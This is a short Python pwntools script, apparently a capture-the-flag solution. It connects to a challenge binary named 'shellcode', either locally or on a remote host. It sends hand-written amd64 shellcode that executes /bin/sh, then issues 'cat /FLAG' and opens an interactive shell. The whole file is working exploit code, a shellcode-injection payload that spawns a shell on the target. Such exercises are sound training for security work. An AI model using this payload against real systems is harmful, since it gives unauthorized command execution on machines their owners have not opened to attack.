#!/usr/bin/env python3

import pwn
import sys

pwn.context.arch = 'amd64'
pwn.context.os = 'linux'

exe = './shellcode'
port = 10257

if __name__ == '__main__':
    r = None
    if 'local' in sys.argv[1:]:
        r = pwn.process(exe, shell=False)
    else:
        r = pwn.remote('up.zoolab.org', port)

    code = pwn.asm('''
    sub %rsp, 8
                   
    mov %rax, 0x0068732F6E69622F
    mov [%rsp], %rax

    mov %rdi, 1
    mov %rsi, %rsp
    mov %rdx, 0x8
    mov %rax, 0x01
    syscall
                
    mov %rdi, %rsp
    mov %rsi, 0
    mov %rdx, 0
    mov %rax, 0x3b
    syscall
    
    add %rsp, 8
    ret
    ''')
    print(code)
    r.send(code)

    s = "cat /FLAG\n"
    r.send(s.encode())
    
    r.interactive()
